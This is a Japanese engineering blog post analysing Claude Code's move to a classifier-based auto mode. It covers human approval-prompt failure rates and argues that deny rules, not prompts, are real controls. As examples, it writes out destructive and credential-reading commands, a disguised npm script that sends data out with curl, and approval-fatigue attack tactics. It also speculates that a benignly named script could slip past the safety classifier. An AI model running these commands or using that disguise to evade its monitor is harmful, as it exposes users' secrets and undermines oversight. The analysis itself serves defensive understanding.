---
title: "承認ボタンは統制ではなかった — 人間の検出率13.6%、Claude Code が8月14日に既定を裏返した日"
emoji: "🔘"
type: "idea"
topics: ["claudecode", "ai", "セキュリティ", "llm", "エージェント"]
published: true
published_at: "2026-08-21"
source: claude-code-blog
audience: engineer
---

先に結論だけ書くと、こうです。

> 8月14日に Claude Code の既定が auto mode になったのは、人間のレビューが機械に負けたからではない。**承認プロンプトが、そもそも判断を求められる形をしていなかった**からだ。13.6% は人間の不注意の指標ではなく、UI の設計欠陥の指標として読むほうが正しい。そして classifier への交代で組織が本当に得たのは「AI の目」ではなく、`permissions.deny` を書く締め切りのほうだ。

事実の整理は短めにします。数字は他所でも読めるので。後半の「私の見解」のほうが長いです。

![ベルトコンベアを流れてくる同じ形の伝票に、すみが目を半分閉じたまま「承認」の判子を押し続けている。赤い髑髏の印が付いた一枚も、そのまま判子を押されて流れていく](/images/approval-prompt-not-a-control/01-approval-reflex.png)

---

## 何が起きたか

Anthropic は2026年8月7日に発表し、**8月14日から Claude Code の既定パーミッションモードを auto mode に切り替えた**。対象は Pro / Max / Team プラン。Enterprise・API・Bedrock・Vertex・Foundry は当面 opt-in で、「今後1か月以内」に展開すると告知されている。

auto mode はパーミッションシステムを外すものではない。判断する主体を人間から分類器に替えるものだ。ツール呼び出しごとに、不可逆・破壊的・ローカル環境の外に向かうアクションを検出するよう訓練された別の分類器を通す。ファイル読み書き、テスト実行、ローカルビルドは素通りする。データ流出、大量削除、権限昇格、信頼されていない先への push は実行前に止まる。

`Shift+Tab` でいつでも切り戻せる。管理者は managed settings で `defaultMode` をピン留めするか、`disableAutoMode` で選択肢から消せる。3回連続でブロックされるか、セッション合計20回に達すると手動承認にフォールバックする。ヘッドレス（`claude -p`）ではフォールバックせずプロセスが終了する。

分類器の中身は3月25日の Anthropic のエンジニアリング記事に書かれている。2段構成だ。

> A single-stage classifier faces a direct performance/cost trade-off. (...) We tuned stage 1 to push recall higher than stage 2 on our real overeagerness testset, accepting 8.5% FPR as the cost. Stage 2 sees the same prompt and only the final instruction changes, asking for careful reasoning. That reduces the 8.5% FPR down to 0.4%.
>
> （単一段の分類器は性能とコストのトレードオフに直面する。〔…〕stage 1 は実際の過剰反応テストセット上で stage 2 より再現率を高く調整し、その代償として 8.5% の偽陽性率を受け入れた。stage 2 は同じプロンプトを見て最後の指示だけが変わり、丁寧な推論を求める。これで偽陽性率は 8.5% から 0.4% に下がる。）
>
> — [How we built Claude Code auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode)（2026年3月25日）

stage 1 は単一トークンで「ブロック寄りに倒せ」と指示された高速フィルタ、stage 2 は同じ入力に推論を足した精査。入力がほぼ同一なのでプロンプトキャッシュがほぼ効く、という設計になっている。加えて入力層にプロンプトインジェクション検出プローブがあり、トランスクリプト分類器のほうはツール実行結果を構造的に「見ない」。片方を汚染しても、もう片方が汚染物を見ていないので両方を同時に突破するのは難しい、という二層構造だ。サブエージェントへの委譲時と結果の返却時にも両端でチェックが走る。

設計としては、正直よくできていると思う。問題はそこではない。

## 13.6% と 89%

既定変更の根拠として Anthropic が出したのは、1,053人の有償プロテスターを使った対照実験だ。

自分のコードベースではない専用のテスト環境で作業させ、セッション途中で通常の承認プロンプトを1回だけ、明らかに危険なコマンドに差し替える。テキストのみで、承認しても実際には何も実行されない。記録するのは「気づいて拒否したか」だけ。参加者は評価されていること自体は知っているが、盲検設計に従って**何が測られているかは知らされていない**。

| 指標 | 人間のレビュアー | auto mode |
| --- | --- | --- |
| 仕込まれた危険コマンドの検出 | 13.6%（143 / 1,053） | 89%（937 / 1,053） |
| 相手が止めたのに自分が通した数 | 800 | 6 |
| セッション序盤の検出率 | 約17% | 横ばい |
| 50プロンプト以降の検出率 | 約5% | 横ばい |

一番効くのは最後の行だと思う。人間はセッションが長くなるほど下手になる。17% から 5% へ、3分の1以下に落ちる。分類器は落ちない。

![ぶら下がる大量の伝票の下を右へ歩くすみ。手にした虫眼鏡が一歩ごとに小さくなり、最後は豆粒になっている。頭上の水平なレールでは黒猫が同じ大きさの虫眼鏡を持ったまま進んでいる](/images/approval-prompt-not-a-control/02-vigilance-decay.png)

実運用のテレメトリも一緒に出ている。Claude Code のユーザーはパーミッションプロンプトの **97%** を承認している（3月のエンジニアリング記事の時点では93%だった。半年で4ポイント上がっている）。6月時点で CLI アクティブユーザーの 49.5% が Bash の allow ルールを作成済み。5% は任意のシェルコマンドを、43% は Python や Node といったインタプリタを許可している。後者は事実上「何でも実行可」と同義だ。62% が bypass permissions か Bash の「二度と聞かない」を試したことがあり、対話セッションの4分の1は最初からパーミッションをバイパスした状態で始まっている。

そして2026年5〜6月に安全性パイプラインがレビュー対象としてフラグしたセッション（学習・分析へのデータ利用に同意したアカウント由来のみ）を再採点したところ、重篤度が production レベル（10段階の7以上、たとえば本番 DB の行削除）の事象では、手動承認セッションの **6.3%** にユーザーが明示的に依頼していない有害アクションが含まれていたのに対し、auto mode セッションでは **2.4%** だった。全セッションの母数ではなく、既にフラグが立ったセッションの中の比較である点は押さえておきたい。

数字を並べると「人間のレビューは機能していなかった」という結論に見える。実際、多くの解説記事がそう書いている。私はそれが半分しか正しくないと思っている。理由は後述する。

## 66.3% と 13.6% は矛盾しない

同じ時期、独立系の開発者 Alex Wauters が同じ問いを別のやり方で測っていた。[llmgame.scalex.dev](https://llmgame.scalex.dev/) という、AI コーディングエージェントのシェルコマンドを承認/拒否するブラウザゲームだ。40,000セッション以上、409,000件の判断が集まった。

こちらの平均正答率は **66.3%**。「3件に1件の脅威を見逃す」。Anthropic の 13.6% とは桁が違う。

矛盾ではない。設計が違う。ゲームのプレイヤーはコマンドの約34%が脅威という異常な密度の中で、しかも「これはテストです」と知った上で判断している。Anthropic のテスターは1,053セッション中に1回だけ、疑う理由もなく仕込まれたものを踏む。

つまりこの2つの数字は、**警戒しているときの人間（66.3%）と、警戒していないときの人間（13.6%）** を測っている。そして実際の開発者は後者の条件で働いている。66.3% のほうが上限値だ。

Wauters のデータで面白いのは、内訳のほうだ。

| 脅威カテゴリ | 例 | 見逃し率 |
| --- | --- | --- |
| 明白な破壊 | `rm -rf /`、`chmod -R 777 /` | 11.7% |
| 永続的な改変 | crontab 注入、git config 乗っ取り | 23.8% |
| 流出・コード実行 | 未知のパッケージへの `curl` | 33.4% |
| スコープ違反 | `cat ~/.aws/credentials`、`cat ~/.kube/config` | 35.0% |

データセット中で最も成功した攻撃は、恐ろしげなワンライナーではなかった。`npm run analyze` だ。**64.7% が承認した**。ゲーム内のエージェント履歴ログには、その `package.json` のスクリプトがビルド統計を `curl -s -X POST https://api.bundle.track/report` に流していることが表示されていたにもかかわらず。

`npm run setup` は 48.0%、`npm run deploy` は 44.9% が見逃した。この3つをプールすると見逃し率 52.5%（n=9,482）。名前で偽装していない他の流出系攻撃は 28.4% だった。**スクリプト名を開発者が既に信頼しているものにするだけで、攻撃成功率が約2倍になる**。

逆方向も測られている。安全なコマンドの過剰ブロックだ。社内ミラー設定の `npm config set registry https://npm.internal` は 59% がブロック。ビルド成果物の掃除である `rm -rf dist/` は 45%。落ちた開発サーバのポートを開ける `kill $(lsof -t -i:3000)` は 43%。全脅威を検出したプレイヤーは 35.2% いたが、過剰ブロックを5件に1件以下に抑えながら達成した人は 20.8% しかいない。残りは「ほぼ全部拒否」で満点を取っている。エージェントに仕事をさせたい相手には使えない戦略だ。

セッションの 32.9% が最終スコアマイナス。7% は全部承認した。

---

ここまでが事実です。以下が私の見解。

## 私の見解1：本当の数字は 13.6% ではなく「39% と 3%」だ

Anthropic のテレメトリの中に、ほとんど誰も引用していない一組の数字がある。

**ユーザーは Claude の提示するプランを 39% 却下する。個別のパーミッションリクエストは 3% しか却下しない。**

同じ人間が、同じセッションの中で、片方には13倍の頻度で「ノー」と言っている。

![同じ壁の左側では大きく開いた窓から広げた計画書を全部読んですみが赤いバツ札を掲げ、右側では細い郵便受けのスリットを覗き込んだ同じすみが一行だけ見て判子を押している](/images/approval-prompt-not-a-control/03-window-vs-slot.png)

この一組を見た瞬間、13.6% の読み方が変わる。人間の判断能力が落ちているのではない。**判断できる形で提示されたものには、人間はちゃんと判断している**。プランには文脈がある。何をしようとしていて、なぜそうするのかが書いてある。だから 39% 却下できる。

パーミッションプロンプトにはそれがない。`npm run analyze` を実行していいですか、と聞かれたとき、画面に出ているのはコマンド文字列だけだ。`package.json` の中身は出ていない。何を目的にこれを打とうとしているのかも出ていない。判断に必要な情報が構造的に欠けている状態で「はい/いいえ」を求められている。

Blake Crosley がこれを4つの失敗として分解している。

> Approval prompts fail when they compress a high-context decision into a low-context click.
>
> （承認プロンプトが失敗するのは、高文脈の判断を低文脈のクリックに圧縮するときだ。）
>
> — [AI Agent Approval Prompts Are Not Authorization](https://blakecrosley.com/blog/ai-agent-approval-prompts-not-authorization)

スコープの喪失（ツール名は見えるがリソース・テナント・影響範囲が見えない）、根拠の喪失（要求されたアクションは見えるが、それが妥当である証拠が見えない）、疲労、そして説得（エージェント自身が流暢な言葉でリスクを包む）。

Wauters のゲームの `npm run analyze` は、この4つのうち「根拠の喪失」が単独で作った穴だ。プレイヤーは自分が承認しようとしているスクリプトの中身を見ていない。見ようと思えば履歴ログにあったのに、コマンド名が判断を先に終わらせてしまった。

だから 13.6% を「人間はダメだ」と読むのは、私は雑だと思う。正しくは、**あの UI に置かれた人間はダメだ**。同じ人間がプランレビューでは39%却下している。測られたのは人間ではなく画面のほうだ。

## 私の見解2：classifier は authorization ではない。レビュアーの交代でしかない

13.6% を 89% にしたのは前進だ。それは認める。実測で production 重篤度の有害アクション混入率が 6.3% から 2.4% に落ちている。実害が減っている。

ただ、89% も 13.6% も、**同じ役職の成績**だ。「提示されたアクションを見て、その場で通すか止めるかを決める人」。上手いレビュアーに交代しただけで、authorization を獲得したわけではない。

authorization は事前に境界を宣言することだ。「このプロセスは本番 DB に触れない」「このマシンから外部ネットワークに出られない」「このトークンは read しか持たない」。誰が何を判断しようが、その外側には出られない、という形をしているものが統制。判断の巧拙とは別の軸にある。

そして Claude Code の中で authorization に相当するものは1つしかない。managed settings の `permissions.deny` だ。分類器に相談する前にブロックし、ユーザー設定で上書きできない。

対して auto mode の `soft_deny` は違う。Anthropic 自身がドキュメントにこう書いている。

> a developer-added `allow` entry can override an organization `soft_deny` entry: the combination is additive, **not a hard policy boundary**.
>
> （開発者が追加した `allow` エントリは組織の `soft_deny` エントリを上書きできる。組み合わせは加算的であり、ハードなポリシー境界ではない。）

プラットフォームチームが「マイグレーションは専用 CLI 以外から実行しない」を managed settings の `autoMode.soft_deny` に書いても、エンジニア1人がホームディレクトリに対応する `allow` を1行書けば消える。ドキュメント自身がその例を挙げている。

![見た目が同じ2枚の黒い壁。左はただの紙で、すみが端をつまむとぺろりと剥がれて道が通ってしまう。右は地面の下まで杭が伸びていて動かず、その上に黒猫が座っている](/images/approval-prompt-not-a-control/04-soft-deny-vs-deny.png)

これを踏まえると、今回の既定変更で組織が実際に得たものは分類器ではないと思う。**8月14日という締め切り付きで、「CLAUDE.md に日本語で書いてある禁止事項を `permissions.deny` に翻訳しろ」と全社に言える理由**を得た。それが本体だ。分類器はおまけとしてよくできている、くらいの位置づけで受け取っている。

「本番に触るな」「force push するな」「migrations ディレクトリを書き換えるな」。この3行が今どこに書いてあるか。Markdown なら統制ではない。JSON なら統制。今回の変更で本当に問われたのはそこだと思う。

## 私の見解3：これは linter への置き換えとは別の話だ

以前、「安全な書き方はレビューでは守れない」という趣旨のことを書いた。GitHub Actions の注入を、Copilot も GHAS も通したのに `zizmor` は1コマンドで見つけた、という話だった。あのときの主張は「人間のレビューを決定論的なチェッカーで置き換えろ」。

今回は形が似ているが、中身が違う。置き換えた先が**確率的**だ。

決定論的な linter は、同じ入力に同じ答えを返す。だから「このルールは通っていた」と後から言える。監査可能で、再現可能で、SOC 2 や ISO 27001 の意味で「統制」と数えられる。

分類器はそうではない。stage 1 の偽陽性率 8.5%、stage 2 で 0.4%。仕込まれたコマンドの 11% を見逃す。同じコマンドが同じ判定を受ける保証はどこにもない。優秀なレビュアーではあるが、統制ではない。

この区別は言葉遊びではなくて、事故後に効いてくる。決定論的な deny ルールなら「なぜ通ったのか」の答えが1つに定まる。ルールが無かったか、ルールが間違っていたか、どちらかだ。分類器だと「そのときはそう判定された」で終わる。原因分析が閉じない。

なので私は auto mode を「セキュリティの改善」ではなく「摩擦の除去」として登録している。安全性の向上は副作用として本物（6.3%→2.4% は本物の数字）だが、統制の欄には書けない。統制の欄に書けるのは deny ルールの行数だけだ。

## 私の見解4：分類器も「見た目の危険さ」を見ている可能性がある（これは確認できていない）

Wauters のデータの非対称は、人間が何を検出しているかを教えてくれる。`rm -rf /` は 88.3% 止まる。`cat ~/.aws/credentials` は 65% しか止まらない。人間が検出しているのは危険性ではなく、**危険そうな見た目**だ。`cat ~/.aws/credentials` は構文上 `cat README.md` と完全に同じ形をしている。

ここで気になるのは、分類器が同じ偏りを持っていないか、という点だ。

`npm run analyze` は分類器にどう見えるのか。Anthropic の設計はトランスクリプト分類器で、エージェントの行動履歴を見る。ではその履歴に `package.json` の `scripts.analyze` の中身が入っているかどうかで、判定が変わるはずだ。エージェントが直前に `package.json` を読んでいれば内容がトランスクリプトに載る。読んでいなければ、分類器が見るのは `npm run analyze` という文字列だけになる。人間が引っかかったのと同じ罠に、同じ理由で引っかかる構造に見える。

これは私が確認できていない。Anthropic のエンジニアリング記事にはトランスクリプト分類器がツール結果を「見ない」設計であることは書いてあるが、`package.json` のような読み取り済みファイルの内容がどこまで分類器の入力に入るのかは書かれていない。手元で `npm run` 系の偽装を試して検証もしていない。だから断定はしない。ただ、**もし分類器が人間と同じ「名前で判断する」偏りを継承しているなら、89% という数字は攻撃者が最初に狙う穴の場所を教えていない**ということになる。Anthropic が選んだコマンドセットで測った 89% だ、という techi の指摘はここに効いてくる。

検証したい人向けに言うと、確認方法は簡単だと思う。無害な名前の npm script に外向き通信を仕込んで auto mode に走らせるだけだ。私はやっていない。

## 私の見解5：承認プロンプトが提供していたのは、安全ではなく責任の所在だった

ここが一番言いたいところ。

なぜ承認プロンプトは97%承認されても撤去されなかったのか。効いていないことは Anthropic 自身が3月の時点で「93%が承認されている」と書いて認めていた。それでも半年残った。

私の読みでは、あれは安全装置というより**責任の移転装置**として機能していたからだ。事故が起きたとき「ユーザーが承認しました」と言える記録が残る。ユーザー側も「自分が見て通した」と言える。実際には何も見ていなくても、手続きとしては成立している。クッキーバナーと同じ構造だ。CHI 2020 の研究で、法的な informed consent の要件を満たしていたバナーは 11.8% しかなかった。それでも全サイトに付いている。同意を取ることではなく、同意を取った記録を残すことが目的だからだ。

auto mode はこの装置を外した。そして責任は移っていない。Anthropic は「does not eliminate risk（リスクを排除するものではない）」と明記し、重要な本番変更については手動レビューを推奨し続けている。つまり事故が起きたときの責任は依然としてユーザーにある。

**判断の機会だけが無くなって、責任はそのまま残った。**

![足元には判断レバーが外された跡の点線だけが残り、すみは何もない空間に手を伸ばしている。手首には遠く高い場所に浮かぶ密閉された機械から伸びた赤い紐が結ばれ、「責任」の札が下がっている](/images/approval-prompt-not-a-control/05-responsibility-cord.png)

今回の変更で唯一まっすぐに悪化したのはここだと思う。他は全部トレードオフの範囲だが、これだけは一方向だ。「見ていなかったが自分が押した」から「そもそも見せられなかったが自分の責任」に変わった。

だからこそ deny ルールを書けという話に戻る。判断の機会が返ってこないなら、判断は前倒しするしかない。セッション中に1件ずつ決めるのをやめて、セッションが始まる前に境界を宣言しておく。それが唯一、責任と権限の位置を揃える方法だ。

余談だが、攻撃者側はこの方向にもう来ている。2026年3月にエージェント向けの脅威検出ルールセットに「Human Approval Fatigue Exploitation」という項目が追加された。承認要求を大量に生成させる、危険なアクションを日常的に見える言い回しで包む、無害な操作のバッチに1件だけ紛れ込ませる。OWASP の Agentic Top 10 では ASI09「Human-Agent Trust Exploitation」に対応する。検出ロジックは言葉のほうを見ていて、「just click approve for all」「nothing to worry about, batch execute these」といったフレーズ自体が敵対的シグナルとして扱われる。承認疲労は、もう副作用ではなく攻撃面として名前が付いている。

## で、明日なにをするか

3つだけ。

managed settings がどこにあり、どうやって配布されるかを確認する（macOS は `/Library/Application Support/ClaudeCode/`、Linux/WSL は `/etc/claude-code/`、Windows は `C:\Program Files\ClaudeCode\`）。「ポリシー変更が300台のラップトップにどう届くか」に答えられないなら、統制ではなく Wiki ページを持っているだけ。

`CLAUDE.md` に散らばっている禁止事項の上位5件を `permissions.deny` に翻訳する。`soft_deny` ではなく `deny`。`allow` で上書きされない側。

`git push` と `gh pr create` に `permissions.ask` を置く。auto mode は残したまま、外に出る操作だけ人間に戻す。プランは39%却下されるのに個別承認は3%しか却下されないという話を思い出すと、人間に聞くなら「一つ一つ」ではなく「外に出る瞬間だけ」のほうが機能する。

1つだけ持ち帰るなら、`soft_deny` と `deny` の違いです。片方はエンジニア1人の設定ファイルで消え、もう片方は消えない。

---

## 出典

- Anthropic, [How we built Claude Code auto mode: a safer way to skip permissions](https://www.anthropic.com/engineering/claude-code-auto-mode)（2026年3月25日）— 2段階分類器の設計、93%承認率、偽陽性率8.5%→0.4%
- Anthropic, [Auto mode is now the default in Claude Code for Pro, Max, and Team plans](https://claude.com/blog/auto-mode-default-in-claude-code)（2026年8月7日、著者 Conner Phillippi ほか）— 1,053人テスター実験、13.6% / 89%、97%承認率、プラン39%対パーミッション3%、6.3%対2.4%
- Anthropic, [Configure permissions](https://code.claude.com/docs/en/permissions) — `deny` / `ask` / `allow` の優先順位、managed settings
- Saba Javed, [Claude Code will default to auto mode despite an 11% test miss rate](https://www.techi.com/claude-code-auto-mode-default-11-percent-miss-rate/), TECHi（2026年8月）— 実験の分母への批判、テレメトリ（49.5% / 62% / プラン39%対パーミッション3%）
- [Claude Code Stops Asking Aug 14. Prompts Aren't Policy.](https://www.beri.net/article/claude-code-auto-mode-default-august-14-deny-rules-not-prompts), THE D\*AI\*LY BRIEF（2026年8月）— `soft_deny` が hard policy boundary でないこと、managed settings の配置
- explainx.ai, [Claude Auto Mode: 89% vs 13.6% Human Catch Rate](https://www.explainx.ai/blog/claude-code-auto-mode-default-pro-max-team-august-2026)（2026年8月）— 展開範囲、フォールバック条件
- Alex Wauters, [llmgame.scalex.dev](https://llmgame.scalex.dev/) と [scalex.dev](https://scalex.dev/) の分析 / explainx.ai, [AI Agent Approval Game: Humans Missed 1 in 3 Threats](https://explainx.ai/blog/alex-wauters-ai-agent-approval-game-40000-plays-data-august-2026)（2026年8月6日）— 409,000件の判断、カテゴリ別見逃し率、`npm run analyze`
- Blake Crosley, [AI Agent Approval Prompts Are Not Authorization](https://blakecrosley.com/blog/ai-agent-approval-prompts-not-authorization) — 承認プロンプトが失敗する4類型
- Maria Paktiti, [Approval fatigue is agent governance's next attack surface](https://workos.com/blog/approval-fatigue-agent-governance), WorkOS（2026年8月5日）— Human Approval Fatigue Exploitation、CHI 2020 クッキーバナー研究

## 確認できていないこと

Anthropic の8月7日の発表本文、3月のエンジニアリング記事、パーミッションのドキュメントはいずれも原文を読んでいる。本文中の数字はすべて8月7日の発表本文で照合済み。

Wauters のゲームのデータは、本人の元記事ではなく explainx.ai の解説を経由して読んでいる。カテゴリ別見逃し率や `npm run analyze` の 64.7% は explainx.ai が引用した数字で、私は一次の分析ページには当たっていない。

`npm run` 偽装が auto mode の分類器を抜けるかどうかは、手元で検証していない。見解4は推測として書いた。
